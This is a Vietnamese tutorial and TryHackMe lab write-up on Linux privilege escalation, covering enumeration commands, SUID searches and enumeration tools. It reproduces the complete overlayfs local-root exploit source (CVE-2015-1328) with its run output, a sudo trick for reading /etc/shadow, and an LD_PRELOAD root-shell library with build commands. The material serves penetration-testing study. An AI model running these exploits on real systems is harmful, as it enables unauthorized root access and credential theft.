# Linux Privilege Escalation (basic)

## I.Introduction

* Privilege escalation là quá trình nâng quyền truy cập (thường lên root).
* Không có giải pháp cố định; phụ thuộc vào cấu hình hệ thống.
* Các yếu tố ảnh hưởng gồm:
  * Phiên bản kernel
  * Ứng dụng đã cài
  * Ngôn ngữ lập trình hỗ trợ
  * Mật khẩu của người dùng khác
* Phòng lab giúp học các kỹ thuật leo thang đặc quyền phổ biến.
*   Kỹ năng quan trọng cho:

    * CTF
    * Thi chứng chỉ
    * Pentest thực tế



## II. What is Privilege Escalation?

### 🛡️ **Privilege Escalation là gì?**

* Là quá trình **nâng quyền truy cập** từ người dùng thường (low privilege) lên người dùng có quyền cao hơn (như root hoặc admin).
* Thường khai thác:
  * **Lỗ hổng phần mềm** (vulnerability),
  * **Lỗi thiết kế hệ thống** (design flaw),
  * **Sai sót cấu hình** (misconfiguration),
* Mục tiêu là truy cập **trái phép vào tài nguyên** bị hạn chế.

<figure><img src="../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

***

### ⚠️ **Tại sao Privilege Escalation quan trọng?**

* Trong kiểm thử xâm nhập thực tế (real-world pentest), **hiếm khi có quyền admin ngay từ đầu**.
* Leo thang đặc quyền là **bước thiết yếu để kiểm soát hoàn toàn hệ thống**.
* Khi có quyền cao, có thể:
  * ✅ **Đặt lại mật khẩu** người dùng khác.
  * ✅ **Vượt qua kiểm soát truy cập** để lấy dữ liệu bảo vệ.
  * ✅ **Sửa đổi cấu hình phần mềm**.
  * ✅ **Duy trì quyền truy cập lâu dài** (persistence).
  * ✅ **Tạo mới hoặc sửa quyền người dùng hiện có**.
  * ✅ **Chạy lệnh hệ thống ở cấp độ admin**.



## III. Enumeration

### 1.🔍 **Enumeration là gì?**

* **Enumeration** là **bước đầu tiên sau khi truy cập vào hệ thống**.
* Mục tiêu: **Thu thập thông tin về hệ thống ( recon )** để xác định các vector leo thang đặc quyền.
* Dù đã có quyền root hoặc chỉ là user thường, **enumeration vẫn rất quan trọng** ở giai đoạn sau khai thác (post-compromise).
* Trong pentest thực tế, khác với CTF, **không dừng lại khi chỉ chiếm được một người dùng** — cần tiếp tục tìm hiểu sâu hơn.



### 2. 🖥️ **Thông tin hệ thống**

* `hostname`
  * Hiển thị tên máy (hostname).
  * Có thể cung cấp vai trò của hệ thống trong mạng nội bộ (VD: `SQL-PROD-01`).
* `uname -a`
  * In thông tin hệ điều hành và kernel (phiên bản nhân Linux).
  * Giúp tra cứu lỗ hổng kernel tiềm năng.
* `cat /proc/version`
  * Hiển thị thông tin kernel và có thể cho biết trình biên dịch (như GCC) có cài hay không.
*   `cat /etc/issue`

    * Cung cấp thông tin hệ điều hành.
    * Dễ bị thay đổi → nên kết hợp với các nguồn khác.



<figure><img src="../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>



### **3.** ⚙️ **Thông tin người dùng và quyền hạn**

*   `id`

    * Xem UID, GID, và các nhóm mà user hiện tại thuộc về.
    * Có thể dùng `id username` để xem info người khác.

    <figure><img src="../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>
*   `cat /etc/passwd`

    * Liệt kê tất cả người dùng (bao gồm user hệ thống).
    * Có thể lọc ra user thật bằng `grep home`.

    <figure><img src="../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>
*   `sudo -l`

    * Xem lệnh nào có thể chạy với `sudo`.

    <figure><img src="../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>
*   `history (kiểu là phần lưu trữ các lệnh đã từng sử dụng , để có thể tái sử dụng lại nhanh chóng thay vì gõ thủ công )`

    * Xem lịch sử lệnh đã gõ → có thể lộ thông tin nhạy cảm như password.

    <figure><img src="../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>



### 4. 🔍 **Xem tiến trình & biến môi trường**

```
PID: ID của tiến trình (duy nhất với mỗi tiến trình).

TTY: Loại terminal mà người dùng đang sử dụng.

Time: Thời gian CPU mà tiến trình đã sử dụng (KHÔNG phải là tổng thời gian tiến trình 
đã chạy).

CMD: Lệnh hoặc chương trình đang được chạy (KHÔNG hiển thị các tham số dòng lệnh).
```

*   `ps`

    * Xem tiến trình đang chạy.
    *   Các tuỳ chọn:

        * `ps -A`: tất cả tiến trình.

        <figure><img src="../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

        * `ps aux`: tiến trình của mọi user, hiển thị user và tiến trình không gắn TTY.



        * `ps axjf`: hiển thị cây tiến trình.

        <figure><img src="../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>


* `env`
  * Hiển thị biến môi trường.
  * Kiểm tra biến `PATH`, có thể chứa compiler hoặc ngôn ngữ lập trình (Python, v.v.). Ta hoàn toàn có thể lợi dụng để chạy mã trên hệ thống đích hoặc được tận dụng để leo thang đặc quyền.

<figure><img src="../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>



### 5. 📂 **Thông tin tệp & thư mục**

*   `ls -la`

    * Hiển thị chi tiết file bao gồm file ẩn.
    * Luôn dùng với `-la` để không bỏ sót file quan trọng.



<figure><img src="../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>



### 6. 🌐 **Mạng**

* `ifconfig`
  * Hiển thị thông tin các interface mạng.
  * Giúp xác định:
    * Các địa chỉ IP được gán cho mỗi interface.
    * Trạng thái hoạt động (up/down) của từng interface.
  * Trong tình huống thực chiến:
    * Nếu hệ thống có nhiều interface (VD: `eth0`, `tun0`, `tun1`), rất có thể đây là điểm trung gian (pivot) giữa nhiều mạng nội bộ khác nhau.
    * Chẳng hạn: `eth0` là mạng mà bạn tấn công từ ngoài vào, còn `tun0`, `tun1` là mạng nội bộ khác chưa thể truy cập → có thể dùng để **pivoting** sang các hệ thống khác.

<figure><img src="../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

* `ip route`
  * Kiểm tra các tuyến đường mạng (network routes).
  * Xem **các route (đường đi mạng)** mà hệ thống sử dụng để giao tiếp.
  * Giúp bạn:
    * Biết hệ thống có thể giao tiếp với những mạng nào.
    * Tìm mạng nội bộ khác để khám phá tiếp.

<figure><img src="../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

* `netstat`
  *   Các tuỳ chọn hữu ích:

      * `netstat -a`: tất cả kết nối và cổng đang nghe.

      <figure><img src="../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

      * `netstat -l`: chỉ các cổng đang nghe.

      <figure><img src="../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

      * `netstat -at` / `-au`: chỉ TCP / UDP.



      * `netstat -s`: thống kê giao thức mạng.

      → Thống kê **số liệu sử dụng mạng** phân theo giao thức.\
      → Rất hữu ích để phân tích giao thức nào đang được sử dụng nhiều.

      <figure><img src="../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

      * `netstat -tp`: hiển thị PID và dịch vụ.

      → Hiển thị **tên tiến trình** và **PID** tương ứng với kết nối mạng đang mở.\
      → Có thể cần quyền root để xem thông tin đầy đủ.



      * `netstat -i`: thống kê interface.

      <figure><img src="../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

      * `netstat -ano`: tất cả socket + không phân giải tên + thời gian.



<figure><img src="../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

* `netstat -ano` thường thấy trong các bài write-up:
  * `-a`: hiển thị tất cả socket.
  * `-n`: không phân giải tên miền (cho tốc độ nhanh hơn, hiển thị IP).
  * `-o`: hiển thị các timer (thời gian sống của kết nối).
* Nếu chạy với quyền root, bạn có thể nhìn thấy tiến trình như:\
  → `2641/nc` nghĩa là tiến trình `nc` (Netcat) đang mở kết nối.

<figure><img src="../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>



`netstat -i`\
→ Thống kê mức độ hoạt động của các **interface mạng**.\
→ Giúp xác định interface nào đang truyền dữ liệu nhiều nhất (VD: `eth0` hoạt động nhiều hơn `tun1`).

<figure><img src="../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

### 7. 🧭 **Tìm kiếm với `find`**&#x20;

* `find` là một công cụ tích hợp sẵn trong Linux, cực kỳ mạnh mẽ.
* Có thể dùng để tìm **file**, **thư mục**, **theo quyền**, **theo thời gian thay đổi**, **theo người sở hữu**, **kích thước**, v.v.
* Rất quan trọng để **phát hiện file khả nghi**, **tệp chứa cờ (flag)**, hoặc **tệp có thể khai thác leo thang đặc quyền (như SUID)**.



#### 📂 **Tìm kiếm file và thư mục**

| Lệnh                          | Ý nghĩa                                                                    |
| ----------------------------- | -------------------------------------------------------------------------- |
| `find . -name flag1.txt`      | Tìm file có tên là `flag1.txt` trong thư mục hiện tại.                     |
| `find /home -name flag1.txt`  | Tìm `flag1.txt` trong toàn bộ thư mục `/home`.                             |
| `find / -type d -name config` | Tìm **thư mục** có tên `config` trong toàn bộ hệ thống.                    |
| `find / -type f -perm 0777`   | Tìm **file có quyền 777** (ai cũng có thể đọc, ghi, thực thi → nguy hiểm). |
| `find / -perm a=x`            | Tìm tất cả file có quyền thực thi (`executable`) cho mọi người.            |
| `find /home -user frank`      | Tìm tất cả file trong `/home` thuộc sở hữu của user `frank`.               |

***

#### 🕒 **Tìm kiếm theo thời gian**

| Lệnh               | Ý nghĩa                                            |
| ------------------ | -------------------------------------------------- |
| `find / -mtime 10` | Tìm file **bị sửa đổi trong 10 ngày qua**.         |
| `find / -atime 10` | Tìm file **được truy cập trong 10 ngày qua**.      |
| `find / -cmin -60` | Tìm file **bị sửa đổi trong vòng 60 phút qua**.    |
| `find / -amin -60` | Tìm file **được truy cập trong vòng 60 phút qua**. |

***

#### 📏 **Tìm theo kích thước**

| Lệnh                 | Ý nghĩa                                    |
| -------------------- | ------------------------------------------ |
| `find / -size 50M`   | Tìm file có kích thước đúng bằng **50MB**. |
| `find / -size +100M` | Tìm file có kích thước **lớn hơn 100MB**.  |
| `find / -size -1M`   | Tìm file nhỏ hơn **1MB**.                  |

> ⚠️ Lưu ý: `find` thường sẽ trả về nhiều lỗi truy cập → nên dùng `2>/dev/null` để **ẩn thông báo lỗi**:

```bash
find / -type f 2>/dev/null
```

***

#### ✍️ **Tìm thư mục/file có thể ghi hoặc thực thi**

#### 🔧 Thư mục có thể ghi (rất nguy hiểm nếu bị ghi bởi user thường):

| Lệnh                                    | Ý nghĩa                                             |
| --------------------------------------- | --------------------------------------------------- |
| `find / -writable -type d 2>/dev/null`  | Tìm thư mục mà user hiện tại có thể ghi.            |
| `find / -perm -222 -type d 2>/dev/null` | Tìm thư mục **world-writeable** (ai cũng ghi được). |
| `find / -perm -o w -type d 2>/dev/null` | Tương đương với lệnh trên, theo cách viết khác.     |

#### 🚀 Thư mục có thể thực thi (chạy được file bên trong):

| Lệnh                                    | Ý nghĩa                                                   |
| --------------------------------------- | --------------------------------------------------------- |
| `find / -perm -o x -type d 2>/dev/null` | Tìm thư mục mà **ai cũng có thể thực thi** file trong đó. |

***

#### 👨‍💻 **Tìm ngôn ngữ lập trình hoặc công cụ phát triển**

* Những ngôn ngữ này có thể dùng để **viết và thực thi mã độc**, rất quan trọng trong khai thác.

```bash
find / -name perl*
find / -name python*
find / -name gcc*
```

***

#### 🔒 **Tìm file có quyền SUID (Privilege Escalation Path)**

* **SUID (Set User ID)**: Khi một file thực thi có SUID bit, nó sẽ chạy với **quyền của chủ sở hữu** (thường là root), thay vì quyền của user đang chạy nó.
* Đây là **đường tắt quan trọng để leo thang đặc quyền** từ user thường lên root nếu tìm thấy file có SUID bị cấu hình sai.

| Lệnh                                    | Ý nghĩa                                                       |
| --------------------------------------- | ------------------------------------------------------------- |
| `find / -perm -u=s -type f 2>/dev/null` | Tìm file có **SUID bit** (đánh dấu `s` trong quyền của user). |

> ⚠️ Khi tìm được file dạng này → kiểm tra kỹ xem có thể khai thác hay không (vd: `/usr/bin/passwd`, `nmap`, `vim`,...).



## III.Automated Enumeration Tools

#### 🔹 Mục đích

* Những công cụ này giúp bạn **tiết kiệm thời gian** khi kiểm tra hệ thống mục tiêu.
* Tuy nhiên, **chúng có thể bỏ sót một số vector leo thang đặc quyền**, nên không nên phụ thuộc hoàn toàn.
* Quan trọng: bạn **chỉ có thể sử dụng công cụ nào phù hợp với môi trường mục tiêu** (VD: nếu hệ thống không có Python, bạn không thể chạy script Python).

👉 Vì thế, nên **biết cách dùng nhiều công cụ khác nhau**, thay vì chỉ dựa vào một công cụ duy nhất.

| Tên công cụ                       | Mô tả ngắn                                                                                                              | Link                                                                                                               |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **LinPEAS**                       | Công cụ kiểm tra đặc quyền cực mạnh. Tự động dò tìm thông tin hệ thống, quyền SUID, file nhạy cảm, cronjob, v.v.        | [🔗 LinPEAS GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) |
| **LinEnum**                       | Script Bash phổ biến, liệt kê thông tin kernel, user, quyền sudo, file cấu hình, và nhiều thứ khác. Gọn nhẹ và dễ chạy. | [🔗 LinEnum GitHub](https://github.com/rebootuser/LinEnum)                                                         |
| **LES (Linux Exploit Suggester)** | Gợi ý khai thác local dựa trên phiên bản kernel. Hữu ích để tìm CVE phù hợp.                                            | [🔗 LES GitHub](https://github.com/mzet-/linux-exploit-suggester)                                                  |
| **Linux Smart Enumeration (LSE)** | Tập trung vào liệt kê một cách thông minh: user, network, dịch vụ, quyền đặc biệt, v.v.                                 | [🔗 LSE GitHub](https://github.com/diego-treitos/linux-smart-enumeration)                                          |
| **Linux Priv Checker**            | Script Python đơn giản để kiểm tra một số cấu hình và quyền cơ bản. Thích hợp nếu hệ thống có Python.                   | [🔗 Linux Priv Checker GitHub](https://github.com/linted/linuxprivchecker)                                         |

🧠 **Tips sử dụng**

* ⚠️ Trước khi chạy bất kỳ công cụ nào, nên xác định:
  * Có trình thông dịch cần thiết không? (Python, Bash, v.v.)
  * Có thể tải file lên hoặc chạy script không?
* ✅ Nên chạy những công cụ như **LinEnum** hoặc **LinPEAS** đầu tiên nếu được, vì chúng bao quát rất nhiều yếu tố có thể khai thác.
* ❗ Sau khi chạy, hãy **đọc kỹ log đầu ra**, vì chúng thường chứa rất nhiều dữ liệu → cần lọc lấy những điểm đáng chú ý (như file SUID, quyền sudo không password, file `.bak`, cronjob chạy root, v.v.).



## IV. Privilege Escalation: Kernel Exploits

### 1. lý thuyết

Trên hệ thống Linux, **kernel (hạt nhân hệ điều hành)** điều phối giao tiếp giữa các thành phần như bộ nhớ và các ứng dụng. Vì đây là chức năng trọng yếu, kernel cần có các quyền đặc biệt; do đó, một cuộc khai thác thành công vào kernel có thể dẫn đến quyền root.

***

**Phương pháp khai thác Kernel** bao gồm các bước đơn giản:

1. Xác định phiên bản kernel
2. Tìm kiếm và xác định mã khai thác tương ứng với phiên bản kernel của hệ thống mục tiêu
3. Thực thi mã khai thác

Mặc dù trông có vẻ đơn giản, **hãy nhớ rằng nếu khai thác kernel thất bại, hệ thống có thể bị sập (crash)**. Hãy chắc chắn rằng hậu quả này được chấp nhận trong phạm vi cuộc kiểm thử xâm nhập (penetration test) trước khi bạn thực hiện bất kỳ cuộc khai thác nào liên quan đến kernel.

***

**Nguồn nghiên cứu:**

* Dựa trên những gì bạn tìm được, bạn có thể dùng Google để tìm mã khai thác tương ứng đã tồn tại.
* Các nguồn như [https://www.cvedetails.com/](https://www.cvedetails.com/) cũng rất hữu ích.
* Một cách khác là sử dụng các script như **LES (Linux Exploit Suggester)** — nhưng hãy nhớ rằng các công cụ này có thể tạo ra **kết quả dương tính giả** (báo cáo lỗ hổng kernel không tồn tại trên hệ thống mục tiêu) hoặc **âm tính giả** (không báo cáo gì dù kernel có lỗ hổng).

***

**Gợi ý/Ghi chú:**

* Tránh quá cụ thể khi tìm kiếm mã khai thác kernel trên Google, Exploit-DB hoặc dùng `searchsploit`.
* Hãy đảm bảo bạn hiểu **rõ cách hoạt động của mã khai thác** trước khi thực thi. Một số mã khai thác có thể thay đổi hệ thống, khiến nó trở nên mất an toàn hoặc không thể phục hồi sau đó. Dù điều này có thể không gây hậu quả lớn trong môi trường phòng lab hoặc CTF, **nó hoàn toàn không được chấp nhận trong kiểm thử thực tế**.
* Một số mã khai thác có thể yêu cầu tương tác thêm sau khi chạy. Hãy đọc kỹ **mọi chú thích và hướng dẫn** đi kèm mã khai thác.
* Bạn có thể chuyển mã khai thác từ máy của mình sang hệ thống mục tiêu bằng cách sử dụng **Python SimpleHTTPServer** kết hợp với `wget`.



### 2. Thực hành với lab tryhackme

#### infomation

<figure><img src="../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

```
Username: karen
Password: Password1
```

`Mục tiêu của ta chính là leo quyền từ normal user để lên root và đọc file chứa flag`



Đầu tiên ta sẽ access vào cred mà lab cấp cho chúng ta&#x20;

<figure><img src="../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

#### recon



<figure><img src="../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

Các thông tin ta nhận được sau khi recon là : <br>

* **Kernel:** `3.13.0-24-generic`
* **Hệ điều hành:** Ubuntu
* **Architecture:** `x86_64`
* **Ngày build kernel:** 10 tháng 4, 2014

⇒ Ta nhận thấy , dây là 1 phiên bản Kernel rất cũ rồi , vậy nên sẽ tiềm ẩn rất nhiều lỗ hổng nghiêm trọng&#x20;

Tiếp theo , ta sẽ tiến hành đi tìm những PoC đã được công bố tương ứng với phiên bản `kernel`

Ở bước này ta có nhiều cách để tìm các CVE liên quan , ta có thể dùng GPT để yêu cầu nó tìm hoặc sử dụng [CVE-detail](https://www.cvedetails.com/) .

Ta sẽ thử sử dụng cách mà tryhackme họ cung cấp&#x20;

Sau khi xác định được kernel là `3.13.0-24`, mình tiến hành kiểm tra các lỗ hổng phù hợp bằng công cụ `searchsploit`:

Và tìm thấy PoC tiềm năng:

```bash
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/...) - 'overlayfs' Local Privilege Escalation
→ linux/local/37292.c
```

<figure><img src="../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

Bây giờ ta sẽ tiến hành tải PoC xuống máy :&#x20;

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m linux/local/37292.c

  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/kali/37292.c


                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ls  
37292.c  Burpsuite-Professional  data.txt .....
```

```
┌──(kali㉿kali)-[~]
└─$ cat 37292.c    
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}                                                  
```



#### EXPLOIT



Sau khi biên dịch thành công mã khai thác `overlayfs` (CVE-2015-1328) trong thư mục `/tmp`, tôi thực hiện quá trình khai thác nhằm leo thang đặc quyền từ user `karen` lên `root`.

```bash
$ cd /tmp
$ ls
$ nano ofs.c
$ gcc ofs.c -o ofs
```

Tôi xác nhận tài khoản hiện tại chỉ có quyền hạn của user thường:

```bash
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

Tiến hành thực thi file khai thác:

```bash
$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```

Khai thác thực hiện thành công. Một thư viện chia sẻ độc hại được tạo ra và injected thông qua `/etc/ld.so.preload`, dẫn tới việc thực thi lệnh với quyền `root`. Kiểm tra quyền hiện tại:

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

Tôi đã leo quyền thành công.

***

#### FLAG

Kiểm tra nhanh thư mục gốc không hiển thị flag:

```bash
# ls 
ofs  ofs.c
# cd ..
# ls
bin  boot  cdrom  dev  etc  home  ...
# cat flag1.txt
cat: flag1.txt: No such file or directory
```

Sử dụng `find` để dò vị trí của flag:

```bash
# find . -name flag1.txt
./home/matt/flag1.txt
```

Đọc nội dung flag:

```bash
# cat ./home/matt/flag1.txt
THM-28392872729920
```



## V. Privilege Escalation: Sudo

### 1. lý thuyết

#### **Lệnh `sudo` và quyền thực thi đặc quyền**

Lệnh `sudo` theo mặc định cho phép bạn chạy một chương trình với quyền root. Trong một số trường hợp, quản trị viên hệ thống có thể cần cấp cho người dùng thông thường một mức độ linh hoạt nhất định về đặc quyền. Ví dụ, một nhà phân tích SOC cấp thấp có thể cần sử dụng `nmap` thường xuyên, nhưng không được phép truy cập root toàn bộ.

Trong trường hợp này, quản trị viên có thể cấu hình để người dùng đó **chỉ có thể chạy `nmap` với quyền root**, trong khi vẫn giữ mức quyền thông thường với các phần còn lại của hệ thống.

Người dùng có thể kiểm tra quyền sudo hiện tại của mình bằng lệnh:

```bash
sudo -l
```

Trang web [https://gtfobins.github.io/](https://gtfobins.github.io/) là một nguồn thông tin hữu ích cung cấp cách khai thác **bất kỳ chương trình nào mà bạn có quyền chạy với sudo**, để thực hiện leo thang đặc quyền.

***

#### **Khai thác chức năng ứng dụng**

Một số ứng dụng sẽ không có khai thác công khai nào trong bối cảnh này. Ví dụ như máy chủ Apache2.

Trong trường hợp đó, bạn có thể sử dụng một kỹ thuật để rò rỉ thông tin bằng cách tận dụng một chức năng của ứng dụng. Ví dụ: Apache2 hỗ trợ tùy chọn `-f` cho phép chỉ định một tập tin cấu hình thay thế.

<figure><img src="../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

Việc chỉ định tập tin `/etc/shadow` với tùy chọn này sẽ tạo ra thông báo lỗi — **và thông báo lỗi này sẽ hiển thị dòng đầu tiên của tập tin `/etc/shadow`**.

```bash
sudo apache2 -f /etc/shadow
```

***

#### **Khai thác với `LD_PRELOAD`**

Trên một số hệ thống, bạn có thể thấy biến môi trường `LD_PRELOAD`.

<figure><img src="../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

`LD_PRELOAD` là một biến môi trường cho phép chương trình sử dụng **thư viện chia sẻ (shared library)** được chỉ định. Nếu tùy chọn `env_keep` được bật, bạn có thể tạo một thư viện chia sẻ và nó sẽ được nạp và thực thi **trước khi chương trình chính chạy**.

> **Lưu ý:** `LD_PRELOAD` sẽ bị bỏ qua nếu UID thực (real user ID) khác với UID hiệu dụng (effective user ID).

***

#### **Quy trình leo thang đặc quyền qua `LD_PRELOAD`:**

1. Kiểm tra xem hệ thống có hỗ trợ biến `LD_PRELOAD` (và `env_keep`) hay không
2. Viết một đoạn mã C đơn giản và biên dịch thành thư viện `.so` (shared object)
3. Chạy chương trình có quyền sudo kèm theo biến `LD_PRELOAD` trỏ tới thư viện của bạn
4. Thư viện này sẽ mở một shell với quyền root



ĐIỀU KIỆN ĐỂ KHAI THÁC&#x20;

| Yếu tố                        | Diễn giải                                                                 |
| ----------------------------- | ------------------------------------------------------------------------- |
| `sudo -l` cho thấy quyền      | Bạn có thể chạy một chương trình nào đó với `sudo` mà không cần mật khẩu  |
| `LD_PRELOAD` không bị vô hiệu | Hệ thống phải **không lọc bỏ** biến môi trường `LD_PRELOAD` khi chạy sudo |
| `env_keep+=LD_PRELOAD`        | Có thể cần được cấu hình trong `/etc/sudoers` (hoặc không bị chặn)        |

***

#### **Ví dụ mã C thực thi shell root:**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

* Hàm `_init()` sẽ được gọi **ngay khi thư viện được nạp**
* Nó sẽ nâng quyền thành root (UID 0) và mở shell `/bin/bash`



#### **Biên dịch thư viện chia sẻ:**

Lưu mã trên vào tệp `shell.c`, sau đó biên dịch bằng:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

* `-fPIC`: cho phép mã có thể được dùng lại ở nhiều địa chỉ
* `-shared`: tạo ra thư viện `.so`
* `-nostartfiles`: không cần tệp khởi động mặc định

<figure><img src="../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

***

#### **Sử dụng thư viện `.so` với chương trình sudo:**

